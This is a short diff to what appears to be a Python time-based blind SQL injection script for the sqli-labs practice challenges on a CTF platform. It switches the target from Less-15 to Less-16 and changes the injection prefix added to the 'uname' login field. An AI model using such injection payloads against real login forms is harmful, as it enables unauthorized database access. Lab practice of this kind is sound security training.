@@ -4,9 +4,9 @@ from time import time
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://07157819-f12a-48ab-9115-51bb9d5f5982.node4.buuoj.cn/Less-15/'
-# less15:'
-poc = '\''
+baseurl = 'http://33a4c169-51c1-4c19-a2c5-d9a2c19ddf32.node4.buuoj.cn/Less-16/'
+# less15:'  less16:")
+poc = '\")'
 sleepTime = 20
 postData = {
     'uname': 'admin'+poc,
